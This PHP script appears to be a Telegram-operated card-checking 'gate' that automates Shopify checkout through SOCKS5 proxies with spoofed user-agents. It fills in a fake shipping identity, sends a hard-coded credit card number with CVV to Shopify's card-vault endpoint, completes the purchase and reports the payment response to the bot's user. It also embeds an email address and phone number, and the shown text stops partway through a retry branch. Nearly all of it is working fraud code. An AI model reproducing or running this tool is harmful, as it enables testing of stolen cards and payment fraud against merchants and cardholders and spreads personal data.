<?php
$start_time = microtime(true);

ini_set('max_execution_time', 120);

if ($text == '/asy') {
$url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "𝐆𝐚𝐭𝐞 𝐈𝐧𝐟𝐨 - <b>\n• Auto Test /asy \n• Other Gates - /cmds </b> ",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);exit();
}

$url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "[ 𝙎𝙩𝙖𝙩𝙪𝙨 - 𝙎𝙩𝙖𝙧𝙩𝙚𝙙 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙 ]",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);

preg_match('/\bhttps?:\/\/\S+/', $text, $matches);
$purl = $matches[0];

if (strpos($purl ,'?')) { $purls = trim(strip_tags(getStr($purl,'https','?')));
$purl = 'https'.$purls.'';}
  
$max_retries = 3;
$retry_count = 0;
include 'Tools/Proxy.php';
#curl1#
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, ''.$purl.'');
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15);
    curl_setopt($ch, CURLOPT_TIMEOUT, 60);
    curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
    curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
    curl_setopt($ch, CURLOPT_PROXYUSERPWD,$credentials);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
    $headers = array(
    'content-type: application/x-www-form-urlencoded',
    'user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1',);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
    $curl1 = curl_exec($ch);

    #curl2#
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, ''.$purl.'?no_cookies_from_redirect=1');
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15);
    curl_setopt($ch, CURLOPT_TIMEOUT, 60);
    curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
    curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
    curl_setopt($ch, CURLOPT_PROXYUSERPWD,$credentials);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
    $headers = array(
    'content-type: application/x-www-form-urlencoded',
    'user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1',);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
    $curl2 = curl_exec($ch);
    echo "$curl2";
    
    #curl3#
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, ''.$purl.'?cookies_blocked=1&no_cookies_from_redirect=1');
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15);
    curl_setopt($ch, CURLOPT_TIMEOUT, 60);
    curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
    curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
    curl_setopt($ch, CURLOPT_PROXYUSERPWD,$credentials);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
    $headers = array(
    'content-type: application/x-www-form-urlencoded',
    'user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1',);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
    $curl3 = curl_exec($ch);
    $redirect = curl_getinfo($ch)['redirect_url'];

    if (strpos($redirect, '?')) {
      $redirect2 = trim(strip_tags(getStr($redirect,'https','?')));
      $redirect = "https$redirect2";
    }

$url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "[ 𝙎𝙩𝙖𝙩𝙪𝙨 - 𝘾𝙧𝙚𝙖𝙩𝙞𝙣𝙜 𝘾𝙝𝙚𝙘𝙠𝙤𝙪𝙩 𝙇𝙞𝙣𝙠 ]",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);

#curl4#
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, ''.$redirect.'');
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15);
    curl_setopt($ch, CURLOPT_TIMEOUT, 60);
    curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
    curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
    curl_setopt($ch, CURLOPT_PROXYUSERPWD,$credentials);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
    $headers = array(
    'content-type: application/x-www-form-urlencoded',
    'user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1',);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
    $curl4 = curl_exec($ch);
    $autht1 = trim(strip_tags(getStr($curl4,'name="authenticity_token" value="','"')));
    $step1 = trim(strip_tags(getStr($curl4,'Checkout.step = "','"')));
    $domain = trim(strip_tags(getStr($curl4,'paypalConfig":{"domain":"','"')));
    $step2 = trim(strip_tags(getStr($curl4,'input type="hidden" name="step" value="','"')));
    $amount = trim(strip_tags(getStr($curl4,'order-summary__emphasis total-recap__final-price skeleton-while-loading" data-checkout-payment-due-target="','"')));
    $ammm = trim(strip_tags(getStr($curl4,'Shopify.Checkout.totalPrice = ',';')));
    $ammmm = trim(strip_tags(getStr($curl4,'span class="payment-due__price skeleton-while-loading--lg" data-checkout-payment-due-target="','"')));
    $taxes = trim(strip_tags(getStr($curl4,'data-checkout-total-taxes-cents="','"')));

    echo "$curl4";
    echo "</br>";
    echo "$autht1";
    echo "</br>";
    echo "$step1";
    echo "</br>";
    echo "$domain";
    echo "</br>";
    echo "$step2";
    echo "</br>";
    echo "$ammm";
    echo "</br>";
    echo "$ammmm";
    echo "</br>";
    echo "$amount";
    echo "</br>";
    echo "$taxes";
    echo "</br>";
    
    #curl5#
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, ''.$redirect.'');
    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15);
    curl_setopt($ch, CURLOPT_TIMEOUT, 60);
    curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
    curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
    curl_setopt($ch, CURLOPT_PROXYUSERPWD,$credentials);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
    $headers = array(
    'content-type: application/x-www-form-urlencoded',
    'user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1',);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_POSTFIELDS, '_method=patch&authenticity_token='.$autht1.'&previous_step='.$step1.'&step='.$step2.'&checkout%5Bemail%5D=abhays32109%40gmail.com&checkout%5Bbuyer_accepts_marketing%5D=0&checkout%5Bbuyer_accepts_marketing%5D=1&checkout%5Bshipping_address%5D%5Bfirst_name%5D=&checkout%5Bshipping_address%5D%5Blast_name%5D=&checkout%5Bshipping_address%5D%5Bcompany%5D=&checkout%5Bshipping_address%5D%5Baddress1%5D=&checkout%5Bshipping_address%5D%5Baddress2%5D=&checkout%5Bshipping_address%5D%5Bcity%5D=&checkout%5Bshipping_address%5D%5Bcountry%5D=&checkout%5Bshipping_address%5D%5Bprovince%5D=&checkout%5Bshipping_address%5D%5Bzip%5D=&checkout%5Bshipping_address%5D%5Bphone%5D=&checkout%5Bshipping_address%5D%5Bcountry%5D=United+States&checkout%5Bshipping_address%5D%5Bfirst_name%5D=Jack&checkout%5Bshipping_address%5D%5Blast_name%5D=Coddrey&checkout%5Bshipping_address%5D%5Bcompany%5D=&checkout%5Bshipping_address%5D%5Baddress1%5D=gardenia+drive+6767&checkout%5Bshipping_address%5D%5Baddress2%5D=&checkout%5Bshipping_address%5D%5Bcity%5D=San+Jose&checkout%5Bshipping_address%5D%5Bprovince%5D=CA&checkout%5Bshipping_address%5D%5Bzip%5D=92055&checkout%5Bshipping_address%5D%5Bphone%5D=%28425%29+374-2724&checkout%5Bremember_me%5D=&checkout%5Bremember_me%5D=0&checkout%5Bclient_details%5D%5Bbrowser_width%5D=894&checkout%5Bclient_details%5D%5Bbrowser_height%5D=746&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=-330');
    $curl5 = curl_exec($ch);
    
    #curl6#
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, ''.$redirect.'?previous_step='.$step1.'&step='.$step2.'');
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15);
    curl_setopt($ch, CURLOPT_TIMEOUT, 60);
    curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
    curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
    curl_setopt($ch, CURLOPT_PROXYUSERPWD,$credentials);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
    $headers = array(
    'content-type: application/x-www-form-urlencoded',
    'user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1',);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
    $curl6 = curl_exec($ch);
    //file_put_contents('curl6.txt', $curl6);
    $step3 = trim(strip_tags(getStr($curl6,'hidden" name="step" value="','"')));
    $autht2 = trim(strip_tags(getStr($curl6,'name="authenticity_token" value="','"')));
    $shpp = trim(strip_tags(getStr($curl6,'radio-wrapper" data-shipping-method="','"')));
    $shp = urlencode($shpp);
    $shpa = trim(strip_tags(getStr($curl6,'data-checkout-total-shipping-cents="','"')));
    $totalp = trim(strip_tags(getStr($curl6,'checkout-total-price-cents="','"')));

$url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "[ 𝙎𝙩𝙖𝙩𝙪𝙨 - 𝙄𝙣𝙨𝙚𝙧𝙩𝙞𝙣𝙜 𝘿𝙚𝙩𝙖𝙞𝙡𝙨 𝙖𝙣𝙙 𝘼𝙙𝙙𝙧𝙚𝙨𝙨 ]",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);

#curl7#
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, ''.$redirect.'');
    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15);
    curl_setopt($ch, CURLOPT_TIMEOUT, 60);
    curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
    curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
    curl_setopt($ch, CURLOPT_PROXYUSERPWD,$credentials);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
    $headers = array(
    'content-type: application/x-www-form-urlencoded',
    'user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1',);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_POSTFIELDS, '_method=patch&authenticity_token='.$autht2.'&previous_step='.$step2.'&step='.$step3.'&checkout%5Bshipping_rate%5D%5Bid%5D='.$shp.'&checkout%5Bnote%5D=%7B%7D&checkout%5Bclient_details%5D%5Bbrowser_width%5D=1519&checkout%5Bclient_details%5D%5Bbrowser_height%5D=746&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=-330');
    $curl7 = curl_exec($ch);

    echo "$curl7";
    echo "</br>";
    echo "</br>";
    echo "</br>";

    #curl8#
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, ''.$redirect.'?previous_step='.$step2.'&step='.$step3.'');
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15);
    curl_setopt($ch, CURLOPT_TIMEOUT, 60);
    curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
    curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
    curl_setopt($ch, CURLOPT_PROXYUSERPWD,$credentials);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
    $headers = array(
    'content-type: application/x-www-form-urlencoded',
    'user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1',);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
    $curl8 = curl_exec($ch);

    $autht3 = trim(strip_tags(getStr($curl8,'name="authenticity_token" value="','"')));
    //file_put_contents('curl8.txt', $curl8);
    echo "$curl8";
    echo "</br>";
    echo "$autht3";
    echo "</br>";
    echo "</br>";
    echo "</br>";

    #curl9#
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, ''.$redirect.'?step=payment_method');
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15);
    curl_setopt($ch, CURLOPT_TIMEOUT, 60);
    curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
    curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
    curl_setopt($ch, CURLOPT_PROXYUSERPWD,$credentials);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
    $headers = array(
    'content-type: application/x-www-form-urlencoded',
    'user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1',);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
    $curl9 = curl_exec($ch);
    $pg = trim(strip_tags(getStr($curl9,'="credit_card"','pay_now">')));
    $pgy = trim(strip_tags(getStr($pg,'data-select-gateway="','"')));
    //file_put_contents('curl9.txt', $curl9);
    echo "</br>";
    echo "$curl9";
    echo "</br>";
    echo "</br>";
    echo "$pg";
    echo "</br>";
    echo "$pgy";
    echo "</br>";
    echo "</br>";
    echo "</br>";

    #curl10#
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://deposit.us.shopifycs.com/sessions');
    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15);
    curl_setopt($ch, CURLOPT_TIMEOUT, 60);
    curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
    curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
    curl_setopt($ch, CURLOPT_PROXYUSERPWD,$credentials);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
    $headers = array(
    'content-type: application/json',
    'Host: deposit.us.shopifycs.com',
    'Origin: https://checkout.shopifycs.com',
    'Referer: https://checkout.shopifycs.com/',
    'user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1',);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_POSTFIELDS, '{"credit_card":{"number":"4180+8800+0075+4522","name":"Jack Coddrey","month":11,"year":2023,"verification_value":"361"},"payment_session_scope":"'.$domain.'"}');
    $curl10 = curl_exec($ch);
    $pid = trim(strip_tags(getStr($curl10,'id":"','"')));
    
    echo "$pid";
    echo "</br>";
    echo "</br>";
    echo "</br>";

    #curl11#
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, ''.$redirect.'');
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15);
    curl_setopt($ch, CURLOPT_TIMEOUT, 60);
    curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
    curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
    curl_setopt($ch, CURLOPT_PROXYUSERPWD,$credentials);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
    $headers = array(
    'content-type: application/x-www-form-urlencoded',
    'user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15',);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_POSTFIELDS, '_method=patch&authenticity_token='.$autht3.'&previous_step='.$step3.'&step=&s='.$pid.'&checkout%5Bpayment_gateway%5D='.$pgy.'&checkout%5Bcredit_card%5D%5Bvault%5D=false&checkout%5Bdifferent_billing_address%5D=false&checkout%5Bremember_me%5D=false&checkout%5Bremember_me%5D=0&checkout%5Bvault_phone%5D=&checkout%5Btotal_price%5D='.$totalp.'&complete=1&checkout%5Bclient_details%5D%5Bbrowser_width%5D=1024&checkout%5Bclient_details%5D%5Bbrowser_height%5D=746&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=-330');
    $curl11 = curl_exec($ch);
    //file_put_contents('curl11.txt', $curl11);

    #curl12#
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, ''.$redirect.'/processing');
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15);
    curl_setopt($ch, CURLOPT_TIMEOUT, 60);
    curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
    curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
    curl_setopt($ch, CURLOPT_PROXYUSERPWD,$credentials);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
    $headers = array(
    'content-type: application/x-www-form-urlencoded',
    'user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1',);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_HEADER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
    $curl12 = curl_exec($ch);
    
    #curl13#
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, ''.$redirect.'/processing?from_processing_page=1');
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15);
    curl_setopt($ch, CURLOPT_TIMEOUT, 60);
    curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
    curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
    curl_setopt($ch, CURLOPT_PROXYUSERPWD,$credentials);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
    $headers = array(
    'content-type: application/x-www-form-urlencoded',
    'user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1',);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_HEADER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
    $curl13 = curl_exec($ch);
    $rspppppp = trim(strip_tags(getStr($curl13,'</svg><div class="notice__content"><p class="notice__text">','</p>')));
    //file_put_contents('curl13.txt', $curl13);

    #curl14#
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, ''.$redirect.'?from_processing_page=1&validate=true');
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15);
    curl_setopt($ch, CURLOPT_TIMEOUT, 60);
    curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
    curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
    curl_setopt($ch, CURLOPT_PROXYUSERPWD,$credentials);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
    $headers = array(
    'content-type: application/x-www-form-urlencoded',
    'user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1',);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
    $curl14 = curl_exec($ch);
    $totalc = trim(strip_tags(getStr($curl14,'data-checkout-payment-due-cents="','"')));
    $rsppppp = trim(strip_tags(getStr($curl14,'</svg><div class="notice__content"><p class="notice__text">','</p>')));
    curl_close($ch);
    file_put_contents('curl14.txt', $curl14);
    $end_time = microtime(true);
    $time0 = $end_time - $start_time;
    $time = substr_replace($time0, '',4);
    echo "NEW PRICE = $totalc";

if ((empty($rsppppp)) || (strpos($curl14, 'your order total has changed')) || (strpos($curl14, 'Your cart has been updated and the previous shipping rate isn’t valid')) || (strpos($curl14, 'There was a problem processing the payment. Try refreshing this page or check your internet connection'))){

$url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "[ 𝙎𝙩𝙖𝙩𝙪𝙨 - 𝙍𝙚𝙙𝙞𝙧𝙚𝙘𝙩𝙞𝙣𝙜 𝙏𝙤 𝙋𝙖𝙮𝙢𝙚𝙣𝙩 𝙋𝙖𝙜𝙚 ]",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);

#curl8#
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, ''.$redirect.'?previous_step='.$step2.'&step='.$step3.'');
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15);
    curl_setopt($ch, CURLOPT_TIMEOUT, 60);
    curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
    curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
    curl_setopt($ch, CURLOPT_PROXYUSERPWD,$credentials);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
    $headers = array(
    'content-type: application/x-www-form-urlencoded',
    'user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1',);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
    $curl8 = curl_exec($ch);

    $autht3 = trim(strip_tags(getStr($curl8,'name="authenticity_token" value="','"')));
    //file_put_contents('curl8.txt', $curl8);
    echo "$curl8";
    echo "</br>";
    echo "$autht3";
    echo "</br>";
    echo "</br>";
    echo "</br>";

    #curl9#
